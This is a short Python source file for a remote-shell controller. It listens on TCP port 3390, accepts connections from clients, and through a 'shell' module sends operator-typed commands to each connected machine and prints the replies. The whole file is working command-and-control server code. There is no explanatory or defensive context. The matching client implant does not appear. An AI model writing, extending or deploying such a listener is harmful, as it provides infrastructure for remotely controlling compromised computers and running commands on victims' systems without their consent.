import socket
import threading

class core_server():
    def __init__(self,port):
        self.port=port
        self.s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('',self.port))
        self.s.listen()
        print("[*]> server started waiting for connections")
        self.modules=("shell")
        self.thread_list=list()

    def shell_module(self,conn):
        while True:
            command=input("[s]>")
            conn.sendall(command.encode())
            print(conn.recv(1024).decode())
            

            

    def run_command(self,conn):
        command=input("[?]> ")
        if command in self.modules:
            if command=="shell":
                print("{*}=> firing up a shell")
                conn.sendall("shell".encode())
                self.thread_list.append(threading.Thread(target=self.shell_module,args=(conn,),daemon=True))
                self.thread_list[len(self.thread_list)-1].start()
                self.thread_list[len(self.thread_list)-1].join()
        else:
            print(f"[x]command unknown module not in {self.modules}")
            exit(2)

    def loop_run(self):
        while True:
            conn, addr=self.s.accept()
            print(f"[*]new conn recived from {addr}")
            threading.Thread(target=self.run_command,args=(conn,),daemon=True).start()


s=core_server(3390)
s.loop_run()
